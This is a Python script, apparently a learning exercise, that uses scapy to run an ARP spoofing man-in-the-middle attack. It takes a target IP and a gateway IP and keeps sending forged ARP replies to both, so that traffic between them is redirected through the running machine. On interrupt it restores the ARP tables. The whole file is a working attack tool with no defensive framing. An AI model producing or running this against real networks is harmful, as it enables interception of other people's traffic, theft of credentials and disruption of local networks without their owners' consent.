import scapy.all as scapy
import time
import optparse


def get_arguments():
    parse = optparse.OptionParser()
    parse.add_option('-t', '--target', dest="target_ip", help="input the ip of target machine")
    parse.add_option('-g', dest="gateway_ip", help="input the ip of the router")
    options, arguments = parse.parse_args()
    if not options.target_ip:
        print("User has not input the target ip, use help for more info")
        exit()
    if not options.gateway_ip:
        print("User has not input the router's ip, use help for more info")
        exit()
    return options


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast/arp_req
    answered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
                       psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False)


def spoof(target_ip, spoof_id):
    # Response Packet, so, op=2
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_id)
    scapy.send(packet, verbose=False)


packet_count = 0
options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    while True:
        packet_count += 2
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print(f"\r[+] Sent Packet {packet_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] User has input CTRL+C to exit")
    print("restoring .....")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
